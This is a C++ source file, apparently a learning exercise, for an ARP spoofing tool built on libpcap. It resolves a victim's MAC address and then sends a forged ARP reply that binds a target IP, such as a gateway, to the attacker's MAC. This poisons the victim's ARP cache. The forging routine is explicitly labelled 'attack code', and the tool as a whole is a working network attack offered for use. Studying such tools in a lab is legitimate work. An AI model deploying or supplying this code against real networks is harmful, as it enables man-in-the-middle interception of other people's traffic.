#pragma once
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <stdlib.h>
using namespace std;

//fp : handler
//sender_MAC : victim
//sender_IP : victim
//host_MAC : host

//struct arp_pckt > arp_request, arp_reply_packet
typedef struct
{
    struct ether_header ethhdr;
    struct ether_arp arphdr;
} arp_pckt;

void getsender_mac(pcap_t *fp, uint8_t* sender_MAC, uint8_t* sender_IP, uint8_t* host_MAC);
void get_host_mac(uint8_t* MAC_str, char* dev);
void str_to_IP(char* argv, uint8_t* IP);
void arpfake(pcap_t *fp, uint8_t* sender_MAC, uint8_t* host_MAC, uint8_t* targetIP, uint8_t* sender_IP);

int main(int argc, char **argv)
{
    pcap_t *fp;
    char errbuf[PCAP_ERRBUF_SIZE];
    u_char packet[100];
    int i;

        /* Check the validity of the command line */
        if (argc != 4)
        {
            printf("usage: %s interface (e.g. 'rpcap://eth0')", argv[0]);
        }

        /* Open the output device */
        fp = pcap_open_live(argv[1], 42, PCAP_OPENFLAG_PROMISCUOUS, 1000, errbuf);
        if(fp == NULL)
        {
            return -1;
        }

        uint8_t attacker_MAC[6];
        uint8_t sender_MAC[6];
        uint8_t sender_IP[4];
        uint8_t target_IP[4];
        get_host_mac(attacker_MAC, argv[1]);
        str_to_IP(argv[2],sender_IP);
        str_to_IP(argv[3],target_IP);
        getsender_mac(fp,sender_MAC,sender_IP,attacker_MAC);
        arpfake(fp,sender_MAC,attacker_MAC,target_IP,sender_IP);
}

void getsender_mac(pcap_t *fp, uint8_t* sender_MAC, uint8_t* sender_IP, uint8_t* host_MAC)
{
    arp_pckt arp_request;

    for (int i=0;i<6;i++)
    {
         arp_request.ethhdr.ether_dhost[i]=0xff;
         arp_request.ethhdr.ether_shost[i]=host_MAC[i];
    }

    //htons : little endian(system) <> bigendian(network)
    arp_request.ethhdr.ether_type = htons(ETH_P_ARP); //htons must be use it !!!
    arp_request.arphdr.ea_hdr.ar_hrd= htons(ARPHRD_ETHER); //htons must be use it !!!
    arp_request.arphdr.ea_hdr.ar_pro = htons(ETH_P_IP); //htons must be use it !!!
    arp_request.arphdr.ea_hdr.ar_hln = 0x06;
    arp_request.arphdr.ea_hdr.ar_pln = 0x04;
    arp_request.arphdr.ea_hdr.ar_op = htons(ARPOP_REQUEST); //htons must be use it !!!

    memcpy(&arp_request.arphdr.arp_sha, host_MAC, 6);
    memset(&arp_request.arphdr.arp_tha, 0, 6);
    memset(&arp_request.arphdr.arp_spa, 0, 4); //source
    memcpy(&arp_request.arphdr.arp_tpa, sender_IP, 4); //target

    u_char arp_send_packet[42];
    memcpy(arp_send_packet, &arp_request, sizeof (arp_request));

    pcap_sendpacket(fp, arp_send_packet, 42);
    arp_pckt* arp_reply_packet;
    while (true) {
      struct pcap_pkthdr* header;
      const u_char* packet;
      int res = pcap_next_ex(fp, &header, &packet);
      if (res == 0) continue;
      if (res == -1 || res == -2) break;

      arp_reply_packet = reinterpret_cast<arp_pckt*>(const_cast<u_char*>(packet));
      if (arp_reply_packet->ethhdr.ether_type != htons(ETH_P_ARP)) {
          continue;
      }
      bool isok = true;
      for (int i=0;i<4;i++) {
          if(arp_request.arphdr.arp_tpa[i] != arp_reply_packet->arphdr.arp_spa[i])
          {
              isok = false;
              break;
          }
      }
      if(isok == true)
      {
          memcpy(sender_MAC,(arp_reply_packet->arphdr.arp_sha),6);
          return;
      }
    }
}

//IP pharsing code
void str_to_IP(char* argv, uint8_t* IP){
    char* tmpargv = strdup(argv); //string duplicate
    char* p = strtok(tmpargv,"."); //string tokenize
    int i=0;
    while (p != NULL)
    {
        IP[i] = strtol(p,nullptr,10); //string to long
        p = strtok(NULL,"."); // string tokenize
        i++;
    }
}

//host_mac copy code
void get_host_mac(uint8_t* MAC_str, char* dev)
{
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, dev);
    if(0 == ioctl(fd, SIOCGIFHWADDR, &s))
    {
        int i;
        for (i = 0; i < 6 ; ++i)
        {
            MAC_str[i] = static_cast<uint8_t>(s.ifr_addr.sa_data[i]);
        }
    }
}

//attack code
void arpfake(pcap_t *fp, uint8_t* sender_MAC, uint8_t* host_MAC, uint8_t* targetIP, uint8_t* sender_IP){
    arp_pckt arp_reply;

    for (int i=0;i<6;i++)
    {
         arp_reply.ethhdr.ether_dhost[i]=sender_MAC[i];
         arp_reply.ethhdr.ether_shost[i]=host_MAC[i];
    }

    arp_reply.ethhdr.ether_type = htons(ETH_P_ARP); //htons must be use it !!!
    arp_reply.arphdr.ea_hdr.ar_hrd= htons(ARPHRD_ETHER); //htons must be use it !!!
    arp_reply.arphdr.ea_hdr.ar_pro = htons(ETH_P_IP); //htons must be use it !!!
    arp_reply.arphdr.ea_hdr.ar_hln = 0x06;
    arp_reply.arphdr.ea_hdr.ar_pln = 0x04;
    arp_reply.arphdr.ea_hdr.ar_op = htons(ARPOP_REPLY); //htons must be use it !!!

    memcpy(&arp_reply.arphdr.arp_sha, host_MAC, 6);
    memcpy(&arp_reply.arphdr.arp_tha, sender_MAC, 6);
    memcpy(&arp_reply.arphdr.arp_spa, targetIP, 4);
    memcpy(&arp_reply.arphdr.arp_tpa, sender_IP, 4);

    u_char arp_attackpacket[42];

    memcpy(arp_attackpacket, &arp_reply, 42);
    pcap_sendpacket(fp, arp_attackpacket, 42);
}
